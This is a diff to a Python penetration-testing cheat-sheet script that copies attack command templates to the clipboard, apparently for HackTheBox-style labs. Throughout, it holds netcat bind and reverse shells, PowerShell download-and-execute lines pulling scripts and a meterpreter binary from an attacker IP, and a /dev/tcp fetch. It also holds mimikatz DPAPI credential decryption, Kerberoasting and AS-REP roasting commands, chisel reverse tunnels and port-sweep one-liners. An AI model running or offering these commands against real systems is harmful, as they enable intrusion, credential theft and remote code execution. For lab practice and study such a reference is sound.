@@ -33,7 +33,14 @@ grep -rl
 /usr/share/john/ssh2john.py
 
 rwinrm
-type nul > your_file.txt
+
+go build -ldflags="-s -w"
+
+mimikatz dpapi files to use:
+/users/<username>/appdata/roaming/microsoft/protect/<s-id>/<file name>
+/users/<username>/appdata/roaming/microsoft/Credentials/<file>
+dpapi:masterkey /in:<file in protect folder> /sid:<user sid> /password:<user password>
+dpapi::cred /in:<file in cred folder>
 """
 
 """
@@ -248,7 +255,7 @@ def dirsearch():
         word_list = "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
 
     options = {
-        1 : ["Sample usage", f"dirsearch -u http://{url}/ -w {word_list} -E"]
+        1 : ["Sample usage", f"dirsearch -u http://{url}/ -w {word_list} -E --simple-report={store_directory}/{url}_webapp_dirsearch.txt"]
     }
 
     copy_to_clipboard(options)
@@ -335,8 +342,8 @@ def ssh():
     options = {1 : ["Create a SSH connection", f"ssh {user}@{target_ip} -p 22"],
         2 : ["Dynamic port forwarding", f"ssh -ND 9050 {user}@{target_ip} -p 22"],
         3 : ["SSH with private key", f"ssh -i [key file] {user}@{target_ip}"],
-        4 : ["Local port forwarding", f"ssh -CNL 81:{source_ip}:{port} {user}@{source_ip} -p 22"],
-        5 : ["Local port forwarding", f"ssh -CNL 81:{target_ip}:{local_port} {user}@{target_ip} -p 22"],
+        4 : ["Local port forwarding", f"ssh -CNL 127.0.0.1:81:{source_ip}:{port} {user}@{source_ip} -p 22"],
+        5 : ["Local port forwarding", f"ssh -CNL 127.0.0.1:81:{target_ip}:{local_port} {user}@{target_ip} -p 22"],
         6 : ["Remote port forwarding", f"ssh -CNR 81:localhost:{local_port} {user}@{target_ip} -p 22"],
         7 : ["Remote port forwarding", f"ssh -CNR 81:localhost:{local_port} {user}@{source_ip} -p 22"]
     }
@@ -356,11 +363,12 @@ def nc():
                 3 : ["Reverse shell listener", f"nc -nvlp {local_port}"],
                 4 : ["Bind shell listener on windows target", f"nc -lvp {target_port} -e cmd.exe"],
                 5 : ["Bind shell connect", f"nc -nv {target_ip} {target_port}"],
-                6 : ["Transfer file with nc at destination", f"nc -l -p {target_port} > out.file"],
-                7 : ["Transfer file with nc at source", f"nc -w 3 [destination] {target_port}< out.file"],
-                8 : ["Transfer compressed file with nc at destination", f"nc -l -p {target_port} | uncompress -c | tar xvfp -"],
-                9 : ["Transfer compressed file with nc at source", f"tar cfp - /some/dir | compress -c | nc -w 3 [destination] {target_port}"],
-                10 : ["Port scan with nc (-u for udp)", f"nc -vz {target_ip} 1-1023"]
+                6 : ["Transfer file with nc at destination 1", f"nc -l -p {target_port} > out.file"],
+                7 : ["Transfer file with nc at destination 2", f'bash -c "cat < /dev/tcp/{source_ip}/8000 > /dev/shm/somefile.sh'],               
+                8 : ["Transfer file with nc at source", f"nc -w 3 [destination] {target_port}< out.file"],
+                9 : ["Transfer compressed file with nc at destination", f"nc -l -p {target_port} | uncompress -c | tar xvfp -"],
+                10 : ["Transfer compressed file with nc at source", f"tar cfp - /some/dir | compress -c | nc -w 3 [destination] {target_port}"],
+                11 : ["Port scan with nc (-u for udp)", f"nc -vz {target_ip} 1-1023"]
             }
             break
     
@@ -481,7 +489,7 @@ def smtp_user_enum():
 
 def ldap():
     options = {
-        1 : ["Sample usage 1", f'ldapsearch -x -h {target_ip} -b "dc=megabank,dc=local"'],
+        1 : ["Sample usage 1", f'ldapsearch -x -h {target_ip} -b "dc=megabank,dc=local | tee {store_directory}/{target_ip}_ldap.txt"'],
         2 : ["Sample usage 1", f"""ldapsearch -x -h {target_ip} -b "dc=megabank,dc=local" -LLL '(&(objectclass=user)(!(lastLogon=0)))'"""],
         3 : ["Sample usage 3", f'nmap -p 389 --script ldap-search {target_ip}'],
     }
@@ -521,7 +529,8 @@ def powershell():
         4 : ["Download and execute powershell script 2", f"IEX(IWR('http://{source_ip}/shell.ps1'))"],
         5 : ["Execute powershell script", f"powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File shell.ps1"],
         6 : ["Download file with powershell", r"(new-object System.Net.WebClient).DownloadFile('http://10.10.14.143:8000/met8888.exe','C:\Users\mhope\Documents\met8888.exe')"],
-        7 : ["Search for file", f"""Get-ChildItem -Path C:\ -Filter *[filename]* -Recurse -ErrorAction SilentlyContinue -Force"""]
+        7 : ["Search for file", f"""Get-ChildItem -Path C:\ -Filter *[filename]* -Recurse -ErrorAction SilentlyContinue -Force"""],
+        8 : ["Encode powershell command", f"""echo -n <command> | iconv --to-code UTF-16LE | base64 -w 0"""]
     }
     
     copy_to_clipboard(options)
@@ -575,9 +584,14 @@ def runas():
     copy_to_clipboard(options)
 
 def impacket():
+    domain = input("Enter the domain: ").strip()
+    user = input("Enter the username: ").strip()
+    password = input("Enter the password: ").strip()
+
     options = {
         1 : ["psexec sample usage", f'psexec.py HTB.local/[username]@{target_ip} "cmd.exe"'],
-        2 : ["GetUserSPNs.py sample usage", f'GetUserSPNs.py <domain>/[username][:password] -dc-ip <ip>']
+        2 : ["GetUserSPNs.py sample usage", f'GetUserSPNs.py {domain}/{user}:"{password}" -dc-ip {target_ip}'],
+        3 : ["GetNPUsers.py sample usage", f'GetNPUsers.py {domain}/{user}:"{password}" -request -format hashcat -outputfile hashes.asreproast -dc-ip {target_ip}']        
     }
     
     copy_to_clipboard(options)
@@ -625,6 +639,15 @@ def socat():
     
     copy_to_clipboard(options)
 
+def chisel():
+    options = {
+        1 : ["Listen on kali box", r"""chisel server -p 8000 -reverse -v"""],
+        2 : ["On target machine 1", f"""chisel client {source_ip}:8000 R:127.0.0.1:8001:{source_ip}:80"""],
+        3 : ["On target machine 2", f"""chisel client {source_ip}:8000 9001:127.0.0.1:8001"""]
+    }
+    
+    copy_to_clipboard(options)
+
 def snmp():
     options = {
         1 : ["Enumerate snmp - need to change version and community string", f"""snmpwalk -c public {target_ip} -v 2c"""],
@@ -648,7 +671,10 @@ def others():
         8 : ["Transfer file 1 - On client - Example:", f"""copy *.zip z:"""],
         9 : ["Transfer file 2 - On client - Powershell", f"""New-PSDrive -Name "EramDrive" -PSProvider "FileSystem" -Root "\\{source_ip}\share"""],
         10 : ["Transfer file 2 - On client - Powershell - Example:", f"""cp EramDrive\somefile"""],
-        11 : ["Check python path", f"""python3 -c 'import sys; print(sys.path)';"""]
+        11 : ["Check python path", f"""python3 -c 'import sys; print(sys.path)';"""],
+        12 : ["Ping bash script", f"""for ip in $(seq 1 5); do ping -c 1 172.18.0.$ip > /dev/null && echo "Online: 172.18.0.$ip"; done"""],
+        13 : ["Ping bash script", f"""for port in 22 25 80 443 8080 8443; do (echo something > /dev/tcp/172.19.0.2/$port && echo "open - $port") 2> /dev/null ; done"""],
+        14 : ["Check permission in windows", f"""type nul > your_file.txt"""]
     }
     
     copy_to_clipboard(options)
@@ -773,7 +799,8 @@ options = {
     "dirsearch": dirsearch,
     "ffuf": ffuf,
     "samba": samba,
-    "ldap": ldap
+    "ldap": ldap,
+    "chisel": chisel
 }
 
 systems = {"windows" : windows, "linux" : linux}
